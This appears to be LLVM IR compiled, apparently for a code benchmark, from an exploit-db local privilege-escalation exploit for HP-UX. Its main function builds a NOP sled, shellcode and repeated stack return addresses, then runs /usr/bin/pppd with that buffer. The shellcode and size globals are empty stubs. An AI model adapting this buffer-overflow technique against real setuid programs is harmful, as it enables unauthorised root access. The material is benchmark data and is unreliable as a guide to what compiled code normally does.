; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hp-ux/local/extr_199.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hp-ux/local/extr_199.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUF_LENGTH = common dso_local global i32 0, align 4
@hppa_shellcode = common dso_local global i8* null, align 8
@STACK_OFFSET = common dso_local global i32 0, align 4
@EXTRA = common dso_local global i32 0, align 4
@HPPA_NOP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [45 x i8] c"Jumping to address 0x%lx B[%d] E[%d] SO[%d]\0A\00", align 1
@.str.1 = private unnamed_addr constant [14 x i8] c"/usr/bin/pppd\00", align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"pppd\00", align 1
@.str.3 = private unnamed_addr constant [13 x i8] c"execl failed\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32*, align 8
  %10 = alloca i32*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = load i32, i32* @BUF_LENGTH, align 4
  %16 = add nsw i32 %15, 8
  %17 = zext i32 %16 to i64
  %18 = call i8* @llvm.stacksave()
  store i8* %18, i8** %6, align 8
  %19 = alloca i8, i64 %17, align 16
  store i64 %17, i64* %7, align 8
  %20 = load i8*, i8** @hppa_shellcode, align 8
  %21 = call i32 @strlen(i8* %20)
  store i32 %21, i32* %12, align 4
  %22 = load i32, i32* @STACK_OFFSET, align 4
  store i32 %22, i32* %13, align 4
  %23 = load i32, i32* @EXTRA, align 4
  store i32 %23, i32* %14, align 4
  %24 = load i32, i32* %4, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %35

26:                                               ; preds = %2
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 1
  %29 = load i8*, i8** %28, align 8
  %30 = call i64 @atoi(i8* %29)
  %31 = load i32, i32* %13, align 4
  %32 = sext i32 %31 to i64
  %33 = add nsw i64 %32, %30
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %13, align 4
  br label %35

35:                                               ; preds = %26, %2
  %36 = load i32, i32* %4, align 4
  %37 = icmp sgt i32 %36, 2
  br i1 %37, label %38, label %47

38:                                               ; preds = %35
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 2
  %41 = load i8*, i8** %40, align 8
  %42 = call i64 @atoi(i8* %41)
  %43 = load i32, i32* %14, align 4
  %44 = sext i32 %43 to i64
  %45 = add nsw i64 %44, %42
  %46 = trunc i64 %45 to i32
  store i32 %46, i32* %14, align 4
  br label %47

47:                                               ; preds = %38, %35
  %48 = bitcast i8* %19 to i32*
  store i32* %48, i32** %9, align 8
  store i32 0, i32* %11, align 4
  br label %49

49:                                               ; preds = %64, %47
  %50 = load i32, i32* %11, align 4
  %51 = sext i32 %50 to i64
  %52 = load i32, i32* @BUF_LENGTH, align 4
  %53 = load i32, i32* %12, align 4
  %54 = sub nsw i32 %52, %53
  %55 = load i32, i32* %14, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = udiv i64 %57, 4
  %59 = icmp ult i64 %51, %58
  br i1 %59, label %60, label %67

60:                                               ; preds = %49
  %61 = load i32, i32* @HPPA_NOP, align 4
  %62 = load i32*, i32** %9, align 8
  %63 = getelementptr inbounds i32, i32* %62, i32 1
  store i32* %63, i32** %9, align 8
  store i32 %61, i32* %62, align 4
  br label %64

64:                                               ; preds = %60
  %65 = load i32, i32* %11, align 4
  %66 = add nsw i32 %65, 1
  store i32 %66, i32* %11, align 4
  br label %49

67:                                               ; preds = %49
  %68 = load i32*, i32** %9, align 8
  store i32* %68, i32** %10, align 8
  %69 = load i32*, i32** %10, align 8
  %70 = getelementptr inbounds i32, i32* %69, i32 -1
  store i32* %70, i32** %10, align 8
  store i32 0, i32* %11, align 4
  br label %71

71:                                               ; preds = %84, %67
  %72 = load i32, i32* %11, align 4
  %73 = load i32, i32* %12, align 4
  %74 = icmp slt i32 %72, %73
  br i1 %74, label %75, label %87

75:                                               ; preds = %71
  %76 = load i8*, i8** @hppa_shellcode, align 8
  %77 = load i32, i32* %11, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = load i8, i8* %79, align 1
  %81 = sext i8 %80 to i32
  %82 = load i32*, i32** %10, align 8
  %83 = getelementptr inbounds i32, i32* %82, i32 1
  store i32* %83, i32** %10, align 8
  store i32 %81, i32* %82, align 4
  br label %84

84:                                               ; preds = %75
  %85 = load i32, i32* %11, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %11, align 4
  br label %71

87:                                               ; preds = %71
  %88 = call i32 (...) @get_sp()
  %89 = load i32, i32* %13, align 4
  %90 = sub nsw i32 %88, %89
  %91 = sext i32 %90 to i64
  store i64 %91, i64* %8, align 8
  store i32 0, i32* %11, align 4
  br label %92

92:                                               ; preds = %121, %87
  %93 = load i32, i32* %11, align 4
  %94 = load i32, i32* %14, align 4
  %95 = sdiv i32 %94, 4
  %96 = icmp slt i32 %93, %95
  br i1 %96, label %97, label %124

97:                                               ; preds = %92
  %98 = load i64, i64* %8, align 8
  %99 = lshr i64 %98, 24
  %100 = and i64 %99, 255
  %101 = trunc i64 %100 to i32
  %102 = load i32*, i32** %10, align 8
  %103 = getelementptr inbounds i32, i32* %102, i32 1
  store i32* %103, i32** %10, align 8
  store i32 %101, i32* %102, align 4
  %104 = load i64, i64* %8, align 8
  %105 = lshr i64 %104, 16
  %106 = and i64 %105, 255
  %107 = trunc i64 %106 to i32
  %108 = load i32*, i32** %10, align 8
  %109 = getelementptr inbounds i32, i32* %108, i32 1
  store i32* %109, i32** %10, align 8
  store i32 %107, i32* %108, align 4
  %110 = load i64, i64* %8, align 8
  %111 = lshr i64 %110, 8
  %112 = and i64 %111, 255
  %113 = trunc i64 %112 to i32
  %114 = load i32*, i32** %10, align 8
  %115 = getelementptr inbounds i32, i32* %114, i32 1
  store i32* %115, i32** %10, align 8
  store i32 %113, i32* %114, align 4
  %116 = load i64, i64* %8, align 8
  %117 = and i64 %116, 255
  %118 = trunc i64 %117 to i32
  %119 = load i32*, i32** %10, align 8
  %120 = getelementptr inbounds i32, i32* %119, i32 1
  store i32* %120, i32** %10, align 8
  store i32 %118, i32* %119, align 4
  br label %121

121:                                              ; preds = %97
  %122 = load i32, i32* %11, align 4
  %123 = add nsw i32 %122, 1
  store i32 %123, i32* %11, align 4
  br label %92

124:                                              ; preds = %92
  %125 = load i64, i64* %8, align 8
  %126 = call i32 @strlen(i8* %19)
  %127 = load i32, i32* %14, align 4
  %128 = load i32, i32* %13, align 4
  %129 = call i32 @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0), i64 %125, i32 %126, i32 %127, i32 %128)
  %130 = call i32 @execl(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0), i8* %19, i8* null)
  %131 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  %132 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %132)
  %133 = load i32, i32* %3, align 4
  ret i32 %133
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @strlen(i8*) #2

declare dso_local i64 @atoi(i8*) #2

declare dso_local i32 @get_sp(...) #2

declare dso_local i32 @printf(i8*, i64, i32, i32, i32) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*) #2

declare dso_local i32 @perror(i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
